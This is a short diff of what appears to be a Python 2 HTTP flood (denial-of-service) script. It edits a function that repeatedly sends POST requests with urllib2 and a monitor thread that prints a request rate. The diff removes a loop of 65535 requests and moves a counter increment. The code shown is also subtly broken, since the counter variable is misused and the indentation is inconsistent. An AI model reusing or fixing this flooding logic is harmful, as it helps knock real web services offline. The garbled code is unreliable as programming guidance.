@@ -91,7 +91,6 @@ def httpcall(url):
 	request.get_method = lambda: "POST"
 	bytes = 65535
 	try:
-		for i in range(bytes):
 			urllib2.urlopen(request)
 	except socket.error as e:
 			#print e.code
@@ -126,9 +125,10 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while True:
-			bytes += 65535
+			
 
 			print "Rps: %d" % bytes
+			bytes += 65535
 
 #execute 
 if len(sys.argv) < 2:
